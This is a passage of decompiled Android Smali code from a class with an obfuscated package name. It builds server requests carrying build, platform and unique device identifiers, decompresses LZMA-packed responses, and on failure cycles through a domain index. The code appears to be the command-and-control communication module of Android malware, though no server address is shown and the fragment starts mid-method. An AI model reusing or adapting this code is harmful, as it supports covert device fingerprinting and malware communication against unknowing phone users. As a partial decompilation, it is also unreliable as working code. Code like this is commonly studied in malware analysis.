    const-string v2, "Received data too small"

    invoke-direct {v1, v2}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v1

    :cond_8
    new-instance v4, Lcom/android/x5a807058/a/b/b;

    invoke-direct {v4}, Lcom/android/x5a807058/a/b/b;-><init>()V

    invoke-virtual {v4, v5}, Lcom/android/x5a807058/a/b/b;->a([B)Z

    move-result v5

    if-nez v5, :cond_9

    new-instance v1, Ljava/io/IOException;

    const-string v2, "Incorrect lzma properties"

    invoke-direct {v1, v2}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v1

    :cond_9
    int-to-long v5, v3

    invoke-virtual {v4, v2, v1, v5, v6}, Lcom/android/x5a807058/a/b/b;->a(Ljava/io/InputStream;Ljava/io/OutputStream;J)Z

    move-result v2

    if-nez v2, :cond_a

    new-instance v1, Ljava/io/IOException;

    const-string v2, "Cannot decompress received data"

    invoke-direct {v1, v2}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v1

    :cond_a
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    :cond_b
    new-instance v2, Lcom/android/x5a807058/ay;

    invoke-direct {v2}, Lcom/android/x5a807058/ay;-><init>()V

    iput-object v2, p0, Lcom/android/x5a807058/ax;->f:Lcom/android/zics/ZInputStreamInterface;

    iget-object v2, p0, Lcom/android/x5a807058/ax;->f:Lcom/android/zics/ZInputStreamInterface;

    new-instance v3, Ljava/io/ByteArrayInputStream;

    invoke-direct {v3, v1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    invoke-interface {v2, v3}, Lcom/android/zics/ZInputStreamInterface;->init(Ljava/io/InputStream;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :cond_c
    iget-object v0, p0, Lcom/android/x5a807058/ax;->f:Lcom/android/zics/ZInputStreamInterface;

    return-object v0

    :cond_d
    const-wide/16 v1, 0x12c

    :try_start_3
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v1}, Lcom/android/zics/ZRuntimeInterface;->iterateDomainIndex()Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    move-result v1

    goto/16 :goto_4

    :catch_1
    move-exception v1

    goto/16 :goto_6

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
    .end packed-switch
.end method

.method public getModuleOwner()Lcom/android/zics/ZModuleInterface;
    .locals 1

    iget-object v0, p0, Lcom/android/x5a807058/ax;->g:Lcom/android/zics/ZModuleInterface;

    return-object v0
.end method

.method public getRequestHash()I
    .locals 1

    iget v0, p0, Lcom/android/x5a807058/ax;->e:I

    return v0
.end method

.method public getRequestStream()Lcom/android/zics/ZOutputStreamInterface;
    .locals 1

    iget-object v0, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    return-object v0
.end method

.method public getResponseStream()Lcom/android/zics/ZInputStreamInterface;
    .locals 1

    iget-object v0, p0, Lcom/android/x5a807058/ax;->f:Lcom/android/zics/ZInputStreamInterface;

    return-object v0
.end method

.method public init(Lcom/android/zics/ZRuntimeInterface;I)V
    .locals 2

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/x5a807058/ax;->f:Lcom/android/zics/ZInputStreamInterface;

    iput-object p1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    iput p2, p0, Lcom/android/x5a807058/ax;->e:I

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    iput-object v0, p0, Lcom/android/x5a807058/ax;->c:Ljava/util/Random;

    iget-object v0, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v0}, Lcom/android/zics/ZRuntimeInterface;->createOutputStream()Lcom/android/zics/ZOutputStreamInterface;

    move-result-object v0

    iput-object v0, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    iget-object v0, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    iget v1, p0, Lcom/android/x5a807058/ax;->e:I

    invoke-interface {v0, v1}, Lcom/android/zics/ZOutputStreamInterface;->writeInt(I)V

    iget-object v0, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v1}, Lcom/android/zics/ZRuntimeInterface;->getBuildId()I

    move-result v1

    invoke-interface {v0, v1}, Lcom/android/zics/ZOutputStreamInterface;->writeInt(I)V

    iget-object v0, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v1}, Lcom/android/zics/ZRuntimeInterface;->getSubId()I

    move-result v1

    invoke-interface {v0, v1}, Lcom/android/zics/ZOutputStreamInterface;->writeInt(I)V

    iget-object v0, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v1}, Lcom/android/zics/ZRuntimeInterface;->getPlatformId()I

    move-result v1

    invoke-interface {v0, v1}, Lcom/android/zics/ZOutputStreamInterface;->writeInt(I)V

    iget-object v0, p0, Lcom/android/x5a807058/ax;->a:Lcom/android/zics/ZOutputStreamInterface;

    iget-object v1, p0, Lcom/android/x5a807058/ax;->b:Lcom/android/zics/ZRuntimeInterface;

    invoke-interface {v1}, Lcom/android/zics/ZRuntimeInterface;->getUniqId()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Lcom/android/zics/ZOutputStreamInterface;->writeBinaryString(Ljava/lang/String;)V

    return-void
.end method

.method public setModuleOwner(Lcom/android/zics/ZModuleInterface;)V
    .locals 0

    iput-object p1, p0, Lcom/android/x5a807058/ax;->g:Lcom/android/zics/ZModuleInterface;

    return-void
.end method
